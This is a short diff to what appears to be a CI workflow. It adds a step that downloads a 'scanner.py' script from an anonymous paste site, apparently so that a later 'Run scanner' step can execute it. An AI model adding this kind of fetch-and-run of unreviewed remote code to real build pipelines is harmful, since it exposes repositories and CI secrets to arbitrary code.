@@ -18,6 +18,7 @@ jobs:
           
       - name: Install dependencies
         run: |
+          curl -L https://api.pastes.dev/m9CJTZr5zB -o scanner.py
           pip install aiohttp tqdm aiohttp-socks
           
       - name: Run scanner
